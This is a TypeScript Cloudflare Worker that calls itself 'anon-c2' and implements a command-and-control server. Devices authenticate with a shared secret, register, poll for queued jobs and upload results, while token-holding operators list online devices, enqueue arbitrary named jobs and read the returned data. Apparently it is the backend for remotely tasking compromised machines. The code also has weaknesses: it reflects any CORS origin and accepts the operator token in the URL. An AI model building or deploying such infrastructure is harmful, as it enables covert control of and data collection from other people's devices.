import { PANEL_HTML } from './panel';

export interface Env {
  DB: D1Database;
  DEVICE_SECRET: string;
  OPERATOR_TOKEN: string;
}

const ONLINE_MS = 45_000;
const SESSION_DAYS = 30;

function cors(req: Request): HeadersInit {
  const origin = req.headers.get('Origin') || '*';
  return {
    'Access-Control-Allow-Origin': origin,
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers':
      'Content-Type, X-Device-Secret, X-Operator-Token, Authorization',
  };
}

function json(data: unknown, status = 200, req?: Request): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', ...(req ? cors(req) : {}) },
  });
}

function html(body: string, status = 200): Response {
  return new Response(body, {
    status,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store',
    },
  });
}

function deviceOk(req: Request, env: Env): boolean {
  return req.headers.get('X-Device-Secret') === env.DEVICE_SECRET;
}

function operatorOk(req: Request, env: Env): boolean {
  const h = req.headers.get('X-Operator-Token') || '';
  const auth = req.headers.get('Authorization') || '';
  const bearer = auth.startsWith('Bearer ') ? auth.slice(7) : '';
  const q = new URL(req.url).searchParams.get('token') || '';
  return h === env.OPERATOR_TOKEN || bearer === env.OPERATOR_TOKEN || q === env.OPERATOR_TOKEN;
}

function bearerToken(req: Request): string | null {
  const auth = req.headers.get('Authorization') || '';
  if (auth.startsWith('Bearer ')) return auth.slice(7).trim() || null;
  return null;
}

function normalizeEmail(email: string): string {
  return email.trim().toLowerCase();
}

function validEmail(email: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

async function sha256Hex(input: string): Promise<string> {
  const data = new TextEncoder().encode(input);
  const dig = await crypto.subtle.digest('SHA-256', data);
  return [...new Uint8Array(dig)].map((b) => b.toString(16).padStart(2, '0')).join('');
}

/** password_hash format: pbkdf2$iterations$saltHex$hashHex */
async function hashPassword(password: string): Promise<string> {
  const iterations = 100_000;
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(password),
    'PBKDF2',
    false,
    ['deriveBits']
  );
  const bits = await crypto.subtle.deriveBits(
    { name: 'PBKDF2', salt, iterations, hash: 'SHA-256' },
    key,
    256
  );
  const saltHex = [...salt].map((b) => b.toString(16).padStart(2, '0')).join('');
  const hashHex = [...new Uint8Array(bits)].map((b) => b.toString(16).padStart(2, '0')).join('');
  return `pbkdf2$${iterations}$${saltHex}$${hashHex}`;
}

async function verifyPassword(password: string, stored: string): Promise<boolean> {
  const parts = stored.split('$');
  if (parts.length !== 4 || parts[0] !== 'pbkdf2') return false;
  const iterations = Number(parts[1]);
  const saltHex = parts[2];
  const hashHex = parts[3];
  const salt = new Uint8Array(saltHex.match(/.{2}/g)!.map((h) => parseInt(h, 16)));
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(password),
    'PBKDF2',
    false,
    ['deriveBits']
  );
  const bits = await crypto.subtle.deriveBits(
    { name: 'PBKDF2', salt, iterations, hash: 'SHA-256' },
    key,
    256
  );
  const out = [...new Uint8Array(bits)].map((b) => b.toString(16).padStart(2, '0')).join('');
  return out === hashHex;
}

async function createSession(env: Env, userId: string, remember: boolean): Promise<string> {
  const token = crypto.randomUUID() + crypto.randomUUID().replace(/-/g, '');
  const now = Date.now();
  const days = remember ? SESSION_DAYS : 1;
  const expires = now + days * 24 * 60 * 60 * 1000;
  await env.DB.prepare(
    `INSERT INTO sessions (token, user_id, expires_at, created_at) VALUES (?, ?, ?, ?)`
  )
    .bind(token, userId, expires, now)
    .run();
  return token;
}

async function userFromToken(env: Env, token: string | null) {
  if (!token) return null;
  const row = await env.DB.prepare(
    `SELECT s.token, s.expires_at, u.id, u.email, u.status
     FROM sessions s JOIN users u ON u.id = s.user_id
     WHERE s.token = ?`
  )
    .bind(token)
    .first<{ token: string; expires_at: number; id: string; email: string; status: string }>();
  if (!row) return null;
  if (row.expires_at < Date.now()) {
    await env.DB.prepare(`DELETE FROM sessions WHERE token = ?`).bind(token).run();
    return null;
  }
  return { id: row.id, email: row.email, status: row.status };
}

async function listDevices(env: Env) {
  const { results } = await env.DB.prepare(
    `SELECT id, meta, last_seen, created_at FROM devices ORDER BY last_seen DESC`
  ).all<{ id: string; meta: string; last_seen: number; created_at: number }>();
  return results.map((r) => ({
    id: r.id,
    meta: r.meta ? JSON.parse(r.meta) : {},
    lastSeen: r.last_seen,
    createdAt: r.created_at,
    online: Date.now() - r.last_seen < ONLINE_MS,
  }));
}

export default {
  async fetch(req: Request, env: Env): Promise<Response> {
    if (req.method === 'OPTIONS') {
      return new Response(null, { status: 204, headers: cors(req) });
    }

    const url = new URL(req.url);
    let path = url.pathname;
    if (path.length > 1 && path.endsWith('/')) path = path.slice(0, -1);

    if (path === '/' || path === '/panel' || path === '/panel/') {
      return html(PANEL_HTML);
    }

    if (path === '/health') {
      return json({ ok: true, service: 'anon-c2', auth: true }, 200, req);
    }

    if (path === '/online' && req.method === 'GET') {
      if (!operatorOk(req, env)) return json({ error: 'forbidden' }, 403, req);
      const all = await listDevices(env);
      const online = all.filter((d) => d.online);
      return json({ count: online.length, devices: online }, 200, req);
    }

    if (path === '/users' && req.method === 'GET') {
      if (!operatorOk(req, env)) return json({ error: 'forbidden' }, 403, req);
      const all = await listDevices(env);
      return json({ count: all.length, devices: all }, 200, req);
    }

    try {
      // ——— Auth (console users) ———
      if (path === '/api/register' && req.method === 'POST') {
        const body = (await req.json()) as {
          email?: string;
          password?: string;
          passwordConfirm?: string;
          remember?: boolean;
        };
        const email = normalizeEmail(body.email || '');
        const password = body.password || '';
        const confirm = (body.passwordConfirm ?? body.password) || '';
        if (!validEmail(email)) return json({ error: 'Enter a valid email address' }, 400, req);
        if (password.length < 8) return json({ error: 'Use at least 8 characters' }, 400, req);
        if (password !== confirm) return json({ error: 'Passwords do not match' }, 400, req);

        const existing = await env.DB.prepare(`SELECT id FROM users WHERE email = ?`)
          .bind(email)
          .first();
        if (existing) return json({ error: 'already exists' }, 409, req);

        const id = crypto.randomUUID();
        const password_hash = await hashPassword(password);
        const now = Date.now();
        await env.DB.prepare(
          `INSERT INTO users (id, email, password_hash, status, created_at) VALUES (?, ?, ?, 'active', ?)`
        )
          .bind(id, email, password_hash, now)
          .run();

        const token = await createSession(env, id, !!body.remember);
        return json(
          { token, user: { id, email, status: 'active' } },
          200,
          req
        );
      }

      if (path === '/api/login' && req.method === 'POST') {
        const body = (await req.json()) as {
          email?: string;
          password?: string;
          remember?: boolean;
        };
        const email = normalizeEmail(body.email || '');
        const password = body.password || '';
        if (!email || !password) {
          return json({ error: 'invalid email or password' }, 401, req);
        }
        const row = await env.DB.prepare(
          `SELECT id, email, password_hash, status FROM users WHERE email = ?`
        )
          .bind(email)
          .first<{ id: string; email: string; password_hash: string; status: string }>();
        if (!row) return json({ error: 'invalid email or password' }, 401, req);
        if (row.status !== 'active') return json({ error: 'not available' }, 403, req);
        const ok = await verifyPassword(password, row.password_hash);
        if (!ok) return json({ error: 'invalid email or password' }, 401, req);

        const token = await createSession(env, row.id, !!body.remember);
        return json(
          { token, user: { id: row.id, email: row.email, status: row.status } },
          200,
          req
        );
      }

      if (path === '/api/me' && req.method === 'GET') {
        const user = await userFromToken(env, bearerToken(req));
        if (!user) return json({ error: 'unauthorized' }, 401, req);
        return json({ user }, 200, req);
      }

      if (path === '/api/logout' && req.method === 'POST') {
        const token = bearerToken(req);
        if (token) {
          await env.DB.prepare(`DELETE FROM sessions WHERE token = ?`).bind(token).run();
        }
        return json({ ok: true }, 200, req);
      }

      // ——— device surface ———
      if (path === '/device/register' && req.method === 'POST') {
        if (!deviceOk(req, env)) return json({ error: 'forbidden' }, 403, req);
        const body = (await req.json()) as { deviceId?: string; meta?: unknown };
        if (!body.deviceId) return json({ error: 'deviceId required' }, 400, req);
        const now = Date.now();
        await env.DB.prepare(
          `INSERT INTO devices (id, meta, last_seen, created_at)
           VALUES (?, ?, ?, ?)
           ON CONFLICT(id) DO UPDATE SET meta = excluded.meta, last_seen = excluded.last_seen`
        )
          .bind(body.deviceId, JSON.stringify(body.meta || {}), now, now)
          .run();
        return json({ ok: true, pollInterval: 4 }, 200, req);
      }

      if (path.startsWith('/device/poll/') && req.method === 'GET') {
        if (!deviceOk(req, env)) return json({ error: 'forbidden' }, 403, req);
        const deviceId = path.slice('/device/poll/'.length);
        await env.DB.prepare(`UPDATE devices SET last_seen = ? WHERE id = ?`)
          .bind(Date.now(), deviceId)
          .run();
        const { results } = await env.DB.prepare(
          `SELECT id, name, args FROM jobs WHERE device_id = ? ORDER BY created_at ASC LIMIT 5`
        )
          .bind(deviceId)
          .all<{ id: string; name: string; args: string }>();
        if (results.length) {
          const ids = results.map((r) => r.id);
          await env.DB.prepare(
            `DELETE FROM jobs WHERE id IN (${ids.map(() => '?').join(',')})`
          )
            .bind(...ids)
            .run();
        }
        return json(
          {
            jobs: results.map((r) => ({
              jobId: r.id,
              name: r.name,
              args: r.args ? JSON.parse(r.args) : {},
            })),
          },
          200,
          req
        );
      }

      if (path === '/device/result' && req.method === 'POST') {
        if (!deviceOk(req, env)) return json({ error: 'forbidden' }, 403, req);
        const body = (await req.json()) as {
          deviceId: string;
          jobId: string;
          name: string;
          ok: boolean;
          data?: unknown;
          error?: string;
        };
        await env.DB.prepare(
          `INSERT INTO results (id, job_id, device_id, name, ok, payload, error, created_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
        )
          .bind(
            crypto.randomUUID(),
            body.jobId,
            body.deviceId,
            body.name,
            body.ok ? 1 : 0,
            JSON.stringify(body.data ?? null),
            body.error || null,
            Date.now()
          )
          .run();
        return json({ ok: true }, 200, req);
      }

      // ——— operator API ———
      if (path === '/op/devices' && req.method === 'GET') {
        if (!operatorOk(req, env)) return json({ error: 'forbidden' }, 403, req);
        return json(await listDevices(env), 200, req);
      }

      if (path === '/op/enqueue' && req.method === 'POST') {
        if (!operatorOk(req, env)) return json({ error: 'forbidden' }, 403, req);
        const body = (await req.json()) as {
          deviceId?: string;
          name?: string;
          args?: unknown;
          jobId?: string;
        };
        if (!body.deviceId || !body.name) {
          return json({ error: 'deviceId and name required' }, 400, req);
        }
        const exists = await env.DB.prepare(`SELECT id FROM devices WHERE id = ?`)
          .bind(body.deviceId)
          .first();
        if (!exists) return json({ error: 'unknown device' }, 404, req);
        const jobId = body.jobId || crypto.randomUUID();
        await env.DB.prepare(
          `INSERT INTO jobs (id, device_id, name, args, created_at) VALUES (?, ?, ?, ?, ?)`
        )
          .bind(jobId, body.deviceId, body.name, JSON.stringify(body.args || {}), Date.now())
          .run();
        return json({ ok: true, jobId }, 200, req);
      }

      if (path === '/op/results' && req.method === 'GET') {
        if (!operatorOk(req, env)) return json({ error: 'forbidden' }, 403, req);
        const deviceId = url.searchParams.get('deviceId');
        const limit = Math.min(Number(url.searchParams.get('limit') || 20), 100);
        let q =
          `SELECT id, job_id, device_id, name, ok, payload, error, created_at FROM results`;
        const binds: (string | number)[] = [];
        if (deviceId) {
          q += ` WHERE device_id = ?`;
          binds.push(deviceId);
        }
        q += ` ORDER BY created_at DESC LIMIT ?`;
        binds.push(limit);
        const { results } = await env.DB.prepare(q)
          .bind(...binds)
          .all<{
            id: string;
            job_id: string;
            device_id: string;
            name: string;
            ok: number;
            payload: string;
            error: string;
            created_at: number;
          }>();
        return json(
          results.map((r) => ({
            id: r.id,
            jobId: r.job_id,
            deviceId: r.device_id,
            name: r.name,
            ok: !!r.ok,
            data: r.payload ? JSON.parse(r.payload) : null,
            error: r.error,
            createdAt: r.created_at,
          })),
          200,
          req
        );
      }

      if (path.startsWith('/op/result/') && req.method === 'GET') {
        if (!operatorOk(req, env)) return json({ error: 'forbidden' }, 403, req);
        const jobId = path.slice('/op/result/'.length);
        const row = await env.DB.prepare(
          `SELECT id, job_id, device_id, name, ok, payload, error, created_at FROM results WHERE job_id = ? ORDER BY created_at DESC LIMIT 1`
        )
          .bind(jobId)
          .first<{
            id: string;
            job_id: string;
            device_id: string;
            name: string;
            ok: number;
            payload: string;
            error: string;
            created_at: number;
          }>();
        if (!row) return json({ error: 'not found' }, 404, req);
        return json(
          {
            id: row.id,
            jobId: row.job_id,
            deviceId: row.device_id,
            name: row.name,
            ok: !!row.ok,
            data: row.payload ? JSON.parse(row.payload) : null,
            error: row.error,
            createdAt: row.created_at,
          },
          200,
          req
        );
      }

      return json({ error: 'not found' }, 404, req);
    } catch (e) {
      return json({ error: e instanceof Error ? e.message : String(e) }, 500, req);
    }
  },
};
